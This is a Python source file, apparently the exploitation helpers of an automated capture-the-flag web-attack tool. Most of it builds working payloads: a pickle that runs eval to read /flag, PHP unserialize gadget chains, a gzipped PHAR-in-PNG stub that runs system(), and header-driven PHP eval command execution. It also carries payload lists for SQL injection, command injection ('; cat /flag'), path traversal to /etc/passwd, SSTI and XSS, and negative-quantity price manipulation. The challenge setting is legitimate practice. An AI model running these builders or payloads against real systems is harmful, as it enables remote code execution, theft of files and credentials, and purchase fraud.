                scripts: Array.from(document.querySelectorAll('script')).slice(0, 80).map((script, index) => ({
                    index,
                    src: script.src || '',
                    inline: script.src ? '' : (script.textContent || '').substring(0, 1000)
                })),
                forms: Array.from(document.querySelectorAll('form')).slice(0, 30).map((form, index) => ({
                    index,
                    action: form.action || location.href,
                    method: (form.method || 'GET').toUpperCase()
                })),
                links: Array.from(document.querySelectorAll('a[href]')).slice(0, 80).map(a => a.href)
            };
        }""")

        script_texts: list[str] = []
        for script in dom.get("scripts", [])[:20]:
            src = script.get("src") if isinstance(script, dict) else ""
            inline = script.get("inline") if isinstance(script, dict) else ""
            if inline:
                script_texts.append(str(inline)[:max_chars])
            elif src:
                try:
                    response = page.context.request.get(src, timeout=5000)
                    content_type = response.headers.get("content-type", "")
                    if response.status < 400 and _looks_textual(content_type):
                        script_texts.append(_sanitize_text(response.text(), max_chars))
                except Exception:
                    continue

        page_html = _sanitize_text(page.content(), max_chars)
        searchable = "\n".join([
            page_html,
            "\n".join(script_texts),
            json.dumps(dom.get("local_storage", {}), ensure_ascii=False),
            json.dumps(dom.get("session_storage", {}), ensure_ascii=False),
            str(dom.get("cookies", "")),
        ])
        endpoints = _extract_endpoint_candidates(searchable)
        flags = _extract_flag_candidates(searchable)
        result = {
            "status": "artifacts_collected",
            "url": dom.get("url", ""),
            "title": dom.get("title", ""),
            "comments": [comment for comment in dom.get("comments", []) if comment][:20],
            "cookies": str(dom.get("cookies", ""))[:1000],
            "local_storage": dom.get("local_storage", {}),
            "session_storage": dom.get("session_storage", {}),
            "script_sources": [script.get("src") for script in dom.get("scripts", []) if isinstance(script, dict) and script.get("src")][:30],
            "forms": dom.get("forms", [])[:20],
            "links": dom.get("links", [])[:40],
            "endpoint_candidates": endpoints,
            "flag_candidates": flags,
        }
        return _sanitize_text(json.dumps(result, ensure_ascii=False, indent=2), 16000)
    except Exception as e:
        return f"Browser collect artifacts error: {e}"


# ── Helpers ──────────────────────────────────────────────────

def _looks_textual(content_type: str) -> bool:
    lowered = (content_type or "").lower()
    return any(kind in lowered for kind in ("text", "json", "xml", "javascript", "html", "graphql", "x-www-form-urlencoded"))


def _parse_headers(headers: dict[str, str] | str | None) -> dict[str, str]:
    if not headers:
        return {}
    if isinstance(headers, dict):
        return {str(k): str(v) for k, v in headers.items()}
    parsed = json.loads(headers)
    if not isinstance(parsed, dict):
        return {}
    return {str(k): str(v) for k, v in parsed.items()}


def _interesting_headers(headers: dict[str, str]) -> dict[str, str]:
    keep = {"content-type", "location", "server", "x-powered-by", "set-cookie"}
    return {key: value for key, value in headers.items() if key.lower() in keep}


def _extract_flag_candidates(text: str) -> list[str]:
    if not text:
        return []
    patterns = [
        r'(?<![A-Za-z0-9_])ISCTF\{[^}\s]{1,200}\}',
        r'(?<![A-Za-z0-9_])CubeCTF\{[^}\s]{1,200}\}',
        r'(?<![A-Za-z0-9_])cube\{[^}\s]{1,200}\}',
        r'(?<![A-Za-z0-9_])CTF\{[^}\s]{1,200}\}',
        r'(?<![A-Za-z0-9_])flag\{[^}\s]{1,200}\}',
    ]
    candidates: list[str] = []
    for pattern in patterns:
            candidates.extend(re.findall(pattern, text, re.IGNORECASE))
    return list(dict.fromkeys(candidates))[:10]


def _pickle_unicode(value: str) -> bytes:
    data = value.encode("utf-8")
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def _pickle_bytes(value: bytes) -> bytes:
    if len(value) <= 0xFF:
        return b"C" + bytes([len(value)]) + value
    return b"B" + len(value).to_bytes(4, "little") + value


def _build_ssxl_set_pickle(flag_path: str = "/flag") -> bytes:
    clean_flag_path = (flag_path or "/flag").replace("\r", "").replace("\n", "")
    expression = f"open('/tmp/ssxl/outs.txt','w').write(open({clean_flag_path!r}).read())"
    inner = f"cbuiltins\neval\n(V{expression}\ntR.".encode("utf-8")
    return b"".join([
        b"\x80\x04",
        _pickle_unicode("__main__"),
        _pickle_unicode("Set"),
        b"\x93)\x81}\x94(",
        _pickle_unicode("secret"),
        _pickle_bytes(b"kaqikaqi"),
        _pickle_unicode("payload"),
        _pickle_bytes(inner),
        b"ub.",
    ])


def _php_serialize_string(value: str) -> str:
    return f's:{len(value.encode("utf-8"))}:"{value}";'


def _build_ssxl_php_bridge_payload(b64data: str, pytools_payload: str) -> str:
    writer = (
        'O:6:"Writer":2:{'
        's:7:"b64data";' + _php_serialize_string(b64data) +
        's:4:"init";s:4:"init";'
        '}'
    )
    shark = (
        'O:5:"Shark":1:{'
        's:3:"ser";' + _php_serialize_string(pytools_payload) +
        '}'
    )
    return (
        'O:6:"Bridge":2:{'
        's:6:"writer";' + writer +
        's:5:"shark";' + shark +
        '}'
    )


def _attack_payloads(strategy: str = "auto", payloads: list[str] | str | None = None) -> list[str]:
    if isinstance(payloads, str) and payloads.strip():
        custom = [part.strip() for part in re.split(r"[\n,]+", payloads) if part.strip()]
        if custom:
            return custom[:25]
    if isinstance(payloads, list) and payloads:
        return [str(item) for item in payloads if str(item).strip()][:25]

    strategy = (strategy or "auto").lower()
    payload_map = {
        "sql": ["' OR '1'='1' --", "admin'--", "' OR 1=1 --", "' UNION SELECT NULL,NULL--"],
        "sql_injection": ["' OR '1'='1' --", "admin'--", "' OR 1=1 --", "' UNION SELECT NULL,NULL--"],
        "command": ["; cat /flag", "| cat /flag", "$(cat /flag)", "`cat /flag`"],
        "command_injection": ["; cat /flag", "| cat /flag", "$(cat /flag)", "`cat /flag`"],
        "path": ["../../../flag", "/flag", "....//....//flag", "../../../etc/passwd"],
        "path_traversal": ["../../../flag", "/flag", "....//....//flag", "../../../etc/passwd"],
        "ssti": ["{{7*7}}", "{{config}}", "${7*7}"],
        "xss": ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"],
        "price": ["-1", "0", "99999999999"],
        "price_manipulation": ["-1", "0", "99999999999"],
    }
    if strategy in payload_map:
        return payload_map[strategy]

    merged: list[str] = []
    for key in ("sql", "command", "path", "ssti", "price"):
        merged.extend(payload_map[key][:2])
    return list(dict.fromkeys(merged))[:12]


def _query_attack_params(params: list[str] | str | dict[str, Any] | None, target_url: str) -> list[str]:
    if isinstance(params, dict) and params:
        return [str(key) for key in params.keys() if str(key).strip()][:12]
    if isinstance(params, str) and params.strip():
        parsed = [part.strip() for part in re.split(r"[\n,]+", params) if part.strip()]
        if parsed:
            return parsed[:12]
    if isinstance(params, list) and params:
        parsed = [str(item).strip() for item in params if str(item).strip()]
        if parsed:
            return parsed[:12]

    query_names = [name for name, _ in parse_qsl(urlparse(target_url).query, keep_blank_values=True)]
    defaults = ["code", "cmd", "command", "exec", "shell", "payload", "q", "query", "id", "file", "path", "page"]
    return list(dict.fromkeys([*query_names, *defaults]))[:12]


def _listing_query_params(params: list[str] | str | dict[str, Any] | None, target_url: str, text: str = "") -> list[str]:
    if params:
        explicit = _query_attack_params(params, target_url)
        if explicit:
            return explicit[:16]

    discovered: list[str] = []
    discovered.extend(name for name, _ in parse_qsl(urlparse(target_url).query, keep_blank_values=True))
    for pattern in (
        r"<input[^>]+name=[\"']([^\"']{1,40})[\"']",
        r"<select[^>]+name=[\"']([^\"']{1,40})[\"']",
        r"<textarea[^>]+name=[\"']([^\"']{1,40})[\"']",
        r"[?&]([A-Za-z][A-Za-z0-9_:-]{0,39})=",
    ):
        discovered.extend(re.findall(pattern, text or "", re.IGNORECASE))

    priority = ["id", "name", "p", "page", "q", "query", "search", "keyword", "sort", "type", "category"]
    ordered = [*priority, *discovered]
    return list(dict.fromkeys(str(item).strip() for item in ordered if str(item).strip()))[:16]


def _listing_query_payloads(payloads: list[str] | str | None = None) -> list[str]:
    if isinstance(payloads, str) and payloads.strip():
        custom = [part.strip() for part in re.split(r"[\n,]+", payloads) if part.strip()]
        if custom:
            return custom[:30]
    if isinstance(payloads, list) and payloads:
        custom = [str(item).strip() for item in payloads if str(item).strip()]
        if custom:
            return custom[:30]
    return [
        "1",
        "2",
        "0",
        "-1",
        "01",
        "001",
        "+1",
        "flag",
        "admin",
        "刀",
        "剑",
        "{{7*7}}",
        "1 and 1=1",
        "1 and 1=2",
        "0 or 1=1",
        "1 union select 1",
        "../flag",
        "/flag",
    ]


def _listing_response_fingerprint(text: str, status: Any = None) -> dict[str, Any]:
    clean = _sanitize_text(_strip_html(text or ""), 20000)
    items = _extract_listing_items(text or "")
    errors = [
        token
        for token in ("query error", "syntax", "traceback", "exception", "internal server error", "sql", "sqlite", "mysql")
        if token in clean.lower()
    ]
    return {
        "status": status,
        "length": len(clean),
        "items": len(items),
        "item_keys": [str(item.get("key") or item.get("text", ""))[:80] for item in items[:12]],
        "errors": errors,
    }


def _listing_query_signals(
    text: str,
    status: Any,
    baseline: dict[str, Any],
    current: dict[str, Any],
) -> list[str]:
    lowered = (text or "").lower()
    signals: list[str] = []
    if status != baseline.get("status"):
        signals.append("status_changed")
    if current.get("item_keys") != baseline.get("item_keys"):
        signals.append("changed")
    try:
        base_len = int(baseline.get("length") or 0)
        cur_len = int(current.get("length") or 0)
        if base_len and abs(cur_len - base_len) > max(80, base_len // 20):
            signals.append("length_changed")
    except Exception:
        pass
    if any(token in lowered for token in ("query error", "syntax error", "traceback", "exception", "internal server error")):
        signals.append("error_oracle")
    if any(token in lowered for token in ("isctf{", "ctf{", "flag{", "cube{")):
        signals.append("flag_candidate")
    return list(dict.fromkeys(signals))


def _extract_listing_items(text: str) -> list[dict[str, Any]]:
    if not text:
        return []
    items: list[dict[str, Any]] = []
    seen: set[str] = set()
    try:
        from bs4 import BeautifulSoup

        soup = BeautifulSoup(text, "html.parser")
        for card in soup.select(".card"):
            label = ""
            name_node = card.select_one(".meta-name")
            if name_node:
                label = _sanitize_text(name_node.get_text(" ", strip=True), 120)
            image = card.find("img")
            href = ""
            if image:
                if not label:
                    label = _sanitize_text(image.get("alt", ""), 120)
                href = _sanitize_text(image.get("src", ""), 200)
            spans = [
                _sanitize_text(span.get_text(" ", strip=True), 80)
                for span in card.select(".meta-row span")
            ]
            item_id = ""
            for value in reversed(spans):
                if re.fullmatch(r"[+-]?\d+", value or ""):
                    item_id = value
                    break
            if not item_id and href:
                match = re.search(r"/(\d+)\.[A-Za-z0-9]+(?:[?#].*)?$", href)
                if match:
                    item_id = match.group(1)
            if not label and not item_id:
                continue
            key = f"card:{item_id}:{label}"
            if key not in seen:
                seen.add(key)
                entry = {"label": label, "key": key}
                if item_id:
                    entry["id"] = item_id
                if href:
                    entry["href"] = html.unescape(href)
                items.append(entry)
    except Exception:
        pass
    for match in re.finditer(r"<a[^>]+href=[\"'](?P<href>[^\"']*(?:[?&]id=|/)(?P<id>\d+)[^\"']*)[\"'][^>]*>(?P<body>.*?)</a>", text, re.IGNORECASE | re.DOTALL):
        label = _strip_html(match.group("body"))
        key = f"id:{match.group('id')}:{label}"
        if key not in seen:
            seen.add(key)
            items.append({"id": match.group("id"), "label": label, "href": html.unescape(match.group("href")), "key": key})
    for match in re.finditer(r"<h[1-6][^>]*>(?P<body>.*?)</h[1-6]>", text, re.IGNORECASE | re.DOTALL):
        label = _strip_html(match.group("body"))
        if not label:
            continue
        key = f"heading:{label}"
        if key not in seen:
            seen.add(key)
            items.append({"label": label, "key": key})
    return items[:24]


def _listing_query_next_actions(attempts: list[dict[str, Any]], flags: list[str]) -> list[str]:
    if flags:
        return ["Submit the recovered flag through the official challenge flow."]
    actions: list[str] = []
    if any("error_oracle" in attempt.get("signals", []) for attempt in attempts):
        actions.append("There is an error oracle; narrow the accepted grammar and test parser/WAF bypasses with one parameter at a time.")
    if any(attempt.get("param") == "id" and "changed" in attempt.get("signals", []) for attempt in attempts):
        actions.append("id is a real filter; compare numeric coercion, boundary ids, and hidden records before trying broader SQL payloads.")
    if any(attempt.get("param") == "name" and "changed" in attempt.get("signals", []) for attempt in attempts):
        actions.append("name is a real filter; test exact/partial matches and reflected-template behavior with non-destructive probes.")
    if not actions:
        actions.append("Use the returned params and snippets to choose one concrete hypothesis; avoid repeating broad UI scans.")
    return actions


def _looks_php_eval_query_source(text: str) -> bool:
    lowered = (text or "").lower()
    return (
        "$_get" in lowered
        and "eval" in lowered
        and any(token in lowered for token in ("preg_match", "code", "cmd", "exec"))
    )


def _looks_php_upload_include_source(text: str) -> bool:
    lowered = (text or "").lower()
    return (
        "include" in lowered
        and "upload" in lowered
        and "$_get" in lowered
        and any(token in lowered for token in ("basename", ".png", "move_uploaded_file", "multipart/form-data"))
    )


def _looks_php_unserialize_flag_source(text: str) -> bool:
    lowered = (text or "").lower()
    return (
        "class flag" in lowered
        and "unserialize" in lowered
        and "$_get" in lowered
        and (
            ("private $a" in lowered and "protected $b" in lowered)
            or "function __destruct" in lowered
            or "create_function" in lowered
        )
    )


def _infer_php_eval_params(text: str) -> list[str]:
    params = re.findall(r"\$_GET\s*\[\s*['\"]([A-Za-z0-9_:-]{1,40})['\"]\s*\]", text or "", re.IGNORECASE)
    return list(dict.fromkeys(params))[:5]


def _extract_upload_storage_hint(text: str) -> str:
    match = re.search(r"([\w./-]+\.(?:phar\.)?png)", text or "", re.IGNORECASE)
    return match.group(1)[:200] if match else ""


def _strip_html(value: str) -> str:
    text = re.sub(r"<[^>]+>", " ", value or "")
    text = re.sub(r"\s+", " ", text)
    return _sanitize_text(text.strip(), 1200)


def _extract_shop_products(text: str, fallback_id: str = "") -> list[dict[str, Any]]:
    products: list[dict[str, Any]] = []
    seen: set[str] = set()
    anchor_pattern = re.compile(
        r"<a[^>]+href=[\"'](?P<href>/products/(?P<id>\d+))[\"'][^>]*>(?P<body>.*?)</a>",
        re.IGNORECASE | re.DOTALL,
    )
    for match in anchor_pattern.finditer(text or ""):
        product = _shop_product_from_html(match.group("body"), match.group("id"))
        if product and product["id"] not in seen:
            products.append(product)
            seen.add(product["id"])

    if fallback_id and fallback_id not in seen:
        product = _shop_product_from_html(text or "", fallback_id)
        if product:
            products.append(product)

    return products


def _shop_product_from_html(fragment: str, product_id: str) -> dict[str, Any] | None:
    price_match = re.search(r"\$\s*([0-9][0-9,]*(?:\.[0-9]+)?)", fragment or "")
    if not price_match:
        return None
    name_match = re.search(r"<h[1-6][^>]*>(.*?)</h[1-6]>", fragment or "", re.IGNORECASE | re.DOTALL)
    name = _strip_html(name_match.group(1)) if name_match else ""
    plain = _strip_html(fragment or "")
    try:
        from decimal import Decimal

        price = Decimal(price_match.group(1).replace(",", ""))
    except Exception:
        return None
    return {
        "id": str(product_id),
        "name": name or f"product {product_id}",
        "price": str(price),
        "text": plain,
    }


def _shop_price(product: dict[str, Any] | None):
    from decimal import Decimal

    if not product:
        return None
    try:
        return Decimal(str(product.get("price", "0")))
    except Exception:
        return None


def _select_shop_target(products: list[dict[str, Any]], target_product_id: str = "") -> dict[str, Any] | None:
    if not products:
        return None
    requested = str(target_product_id or "").strip()
    if requested:
        for product in products:
            if str(product.get("id")) == requested:
                return product

    def target_score(product: dict[str, Any]) -> tuple[int, Any]:
        lowered = f"{product.get('name', '')} {product.get('text', '')}".lower()
        score = 0
        for token in ("flag", "elite", "hacker", "ultimate", "expensive", "fortune", "afford"):
            if token in lowered:
                score += 1
        price = _shop_price(product)
        return score, price if price is not None else 0

    return sorted(products, key=target_score, reverse=True)[0]


def _select_shop_filler(
    products: list[dict[str, Any]],
    selected_target: dict[str, Any] | None,
    filler_product_id: str = "",
) -> dict[str, Any] | None:
    if not products:
        return None
    requested = str(filler_product_id or "").strip()
    if requested:
        for product in products:
            if str(product.get("id")) == requested:
                return product

    target_id = str((selected_target or {}).get("id", ""))
    candidates = []
    for product in products:
        if str(product.get("id")) == target_id:
            continue
        price = _shop_price(product)
        if price is not None and price > 0:
            candidates.append((price, product))
    if not candidates:
        return None
    return sorted(candidates, key=lambda item: item[0])[0][1]


def _shop_quantity_candidates(
    target_product: dict[str, Any] | None,
    filler_product: dict[str, Any] | None,
) -> list[int]:
    from decimal import Decimal, ROUND_FLOOR

    target_price = _shop_price(target_product)
    filler_price = _shop_price(filler_product)
    quantities: list[int] = []
    if target_price is not None and filler_price is not None and filler_price > 0:
        for desired_total in (Decimal("1"), Decimal("10"), Decimal("50"), Decimal("99")):
            if target_price > desired_total:
                units = ((target_price - desired_total) / filler_price).to_integral_value(rounding=ROUND_FLOOR)
                if units > 0:
                    quantities.append(-int(units))
    quantities.extend([-1, -10, -100, -1000, -10000, -99999])
    return list(dict.fromkeys(quantities))


def _build_gzip_phar_png_payload(command: str = "cat /flag") -> bytes:
    """Build a tiny gzipped PHAR whose stub runs a shell command when included."""
    import gzip
    import hashlib
    import struct
    import zlib

    safe_command = str(command or "cat /flag").replace("\\", "\\\\").replace('"', '\\"')
    stub = f'<?php system("{safe_command}"); __HALT_COMPILER(); ?>\r\n'.encode()
    alias = b"codex.phar"
    filename = b"test.txt"
    content = b"test"
    timestamp = int(time.time())
    file_entry = (
        struct.pack("<I", len(filename))
        + filename
        + struct.pack("<IIIII", len(content), timestamp, len(content), zlib.crc32(content) & 0xFFFFFFFF, 0x000001A4)
        + struct.pack("<I", 0)
    )
    manifest_rest = (
        struct.pack("<I", 1)
        + b"\x10\x00"
        + struct.pack("<I", 0x00010000)
        + struct.pack("<I", len(alias))
        + alias
        + struct.pack("<I", 0)
        + file_entry
    )
    phar = stub + struct.pack("<I", len(manifest_rest)) + manifest_rest + content
    phar += hashlib.sha1(phar).digest() + struct.pack("<I", 2) + b"GBMB"
    return gzip.compress(phar, compresslevel=9)


def _build_php_flag_unserialize_payload(command: str = "/usr/b??/?l /?lag") -> str:
    shell = str(command or "/usr/b??/?l /?lag")
    body = f";}}var_dump(`{shell}`);/*"
    return (
        'O:4:"FLAG":2:{'
        + _php_serialize_string("\x00FLAG\x00a")
        + _php_serialize_string("create_function")
        + _php_serialize_string("\x00*\x00b")
        + _php_serialize_string(body)
        + "}"
    )


def _build_php_ezpop_payload(
    command: str = 'echo(file_get_contents(glob("/?lag")[0]));',
    magic_value: str = "213",
) -> str:
    def php_object(class_name: str, props: list[tuple[str, str]]) -> str:
        body = "".join(_php_serialize_string(name) + value for name, value in props)
        return f'O:{len(class_name.encode("latin1", errors="ignore"))}:"{class_name}":{len(props)}:{{{body}}}'

    command_value = command or 'echo(file_get_contents(glob("/?lag")[0]));'
    magic = str(magic_value or "213")
    end = php_object("eenndd", [("command", _php_serialize_string(command_value))])
    invoker = php_object("flaag", [("var10", end), ("var11", _php_serialize_string(magic))])
    caller = php_object("starlord", [("var4", invoker), ("var5", "N;"), ("arg1", "N;")])
    stringer = php_object("anna", [("var6", caller), ("var7", "N;")])
    return php_object("begin", [("var1", stringer), ("var2", "N;")])


def _php_serialize_string(value: str) -> str:
    return f's:{len(value.encode("latin1", errors="ignore"))}:"{value}";'


def _query_attack_payloads(strategy: str = "auto", payloads: list[str] | str | None = None) -> list[dict[str, Any]]:
    if isinstance(payloads, str) and payloads.strip():
        custom = [part.strip() for part in re.split(r"[\n,]+", payloads) if part.strip()]
        if custom:
            return [{"payload": item, "headers": {}} for item in custom[:25]]
    if isinstance(payloads, list) and payloads:
        custom = [str(item).strip() for item in payloads if str(item).strip()]
        if custom:
            return [{"payload": item, "headers": {}} for item in custom[:25]]

    strategy = (strategy or "auto").lower()
    php_eval_payloads = [
        {
            "payload": "system(array_shift(getallheaders()));",
            "headers": {"Zzz": "cat /flag"},
            "raw_payload": "system(next(getallheaders()));",
            "raw_ordered_headers": [("Connection", "cat /flag")],
        },
        {"payload": "system(current(getallheaders()));", "headers": {"Zzz": "cat /flag"}},
        {
            "payload": "system(array_shift(getallheaders()));",
            "headers": {"Zzz": "cat /flag.txt"},
            "raw_ordered_headers": [("Zzz", "cat /flag.txt")],
        },
        {"payload": "phpinfo();", "headers": {}},
    ]
    if strategy in {"php_eval", "eval", "php"}:
        return php_eval_payloads

    generic = [{"payload": item, "headers": {}} for item in _attack_payloads(strategy, None)]
    if strategy == "auto":
        return [*php_eval_payloads, *generic][:25]
    return generic


def _url_with_query_param(target_url: str, param: str, value: str) -> str:
    parsed = urlparse(target_url)
    query = [(name, existing) for name, existing in parse_qsl(parsed.query, keep_blank_values=True) if name != param]
    query.append((param, value))
    return urlunparse(parsed._replace(query=urlencode(query)))


def _raw_http_get(url: str, ordered_headers: list[tuple[str, str]], timeout_ms: int) -> tuple[int, dict[str, str], str]:
    import socket

    parsed = urlparse(url)
    if parsed.scheme != "http" or not parsed.hostname:
        raise ValueError("raw_http transport only supports http URLs")
    port = parsed.port or 80
    host_header = parsed.netloc
    path = urlunparse(("", "", parsed.path or "/", parsed.params, parsed.query, ""))
    timeout_seconds = max(1.0, min(float(timeout_ms or 8000) / 1000.0, 20.0))

    header_names = {name.lower() for name, _ in ordered_headers}
    lines = [f"GET {path} HTTP/1.1"]
    lines.extend(f"{name}: {value}" for name, value in ordered_headers)
    if "host" not in header_names:
        lines.append(f"Host: {host_header}")
    if "connection" not in header_names:
        lines.append("Connection: close")
    lines.append("")
    lines.append("")
    request = "\r\n".join(lines).encode("iso-8859-1", errors="replace")

    with socket.create_connection((parsed.hostname, port), timeout=timeout_seconds) as sock:
        sock.settimeout(timeout_seconds)
        sock.sendall(request)
        chunks: list[bytes] = []
        while True:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)

    raw = b"".join(chunks)
    header_bytes, _, body_bytes = raw.partition(b"\r\n\r\n")
    header_text = header_bytes.decode("iso-8859-1", errors="replace")
    body_text = body_bytes.decode("utf-8", errors="replace")
    status = 0
    response_headers: dict[str, str] = {}
    for index, line in enumerate(header_text.splitlines()):
        if index == 0:
            match = re.search(r"\s(\d{3})\s", line)
            status = int(match.group(1)) if match else 0
            continue
        if ":" in line:
            name, value = line.split(":", 1)
            response_headers[name.strip().lower()] = value.strip()
    return status, response_headers, body_text


def _looks_auth_payload(payload: str) -> bool:
    lowered = payload.lower()
    return any(token in lowered for token in ("'", "admin", "or", "union", "--", "1=1"))


def _success_indicators(text: str) -> list[str]:
    lowered = (text or "").lower()
    indicators = []
    for needle in ("flag{", "isctf{", "cubectf{", "cube{", "ctf{", "welcome", "admin", "dashboard", "traceback", "syntax", "exception"):
        if needle in lowered:
            indicators.append(needle)
    return indicators


def _extract_endpoint_candidates(text: str) -> list[str]:
    if not text:
        return []
    patterns = [
        r'/(?:api|admin|debug|internal|flag|config|upload|login|register|search|cart|checkout)[A-Za-z0-9_./?=&%-]*',
        r'https?://[^\s"\'<>]+',
    ]
    endpoints: list[str] = []
    for pattern in patterns:
        endpoints.extend(re.findall(pattern, text, re.IGNORECASE))
    cleaned = []
    for endpoint in endpoints:
        endpoint = endpoint.rstrip(".,);]'\"")
        if len(endpoint) > 1 and endpoint not in cleaned:
            cleaned.append(endpoint)
    return cleaned[:40]

def _list_clickable(page) -> str:
    """List all clickable elements on the page."""
    try:
        elements = page.evaluate("""() => {
            const clickable = document.querySelectorAll('button, a, [onclick], [role=button], input[type=submit]');
            return Array.from(clickable).slice(0, 20).map(el => ({
                tag: el.tagName,
                text: (el.textContent || el.value || '').trim().substring(0, 60)
            }));
        }""")
        return "; ".join(f"[{e['tag']}]{e['text']}" for e in elements)
    except Exception:
        return "(could not list elements)"
